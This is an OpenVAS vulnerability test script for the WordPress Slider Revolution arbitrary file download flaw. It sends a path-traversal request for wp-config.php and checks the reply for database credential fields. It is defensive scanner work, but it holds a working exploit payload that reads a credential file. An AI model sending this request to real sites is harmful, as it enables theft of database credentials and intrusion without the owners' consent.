###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_slider_revolution_08_14.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Wordpress Slider Revolution Arbitrary File Download Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105070");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11867 $");

  script_name("Wordpress Slider Revolution Arbitrary File Download Vulnerability");


  script_xref(name:"URL", value:"http://h3ck3rcyb3ra3na.wordpress.com/2014/08/15/wordpress-slider-revolution-responsive-4-1-4-arbitrary-file-download-0day/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-08-21 11:02:57 +0200 (Thu, 21 Aug 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
application and the underlying system. Other attacks are also possible.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response");
  script_tag(name:"solution", value:"Ask the vendor for an update");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Wordpress Slider Revolution is prone to an arbitrary file download vulnerability");

  exit(0);
}

include("http_func.inc");

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "DB_NAME" >< buf && "DB_USER" >< buf && "DB_PASSWORD" >< buf )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
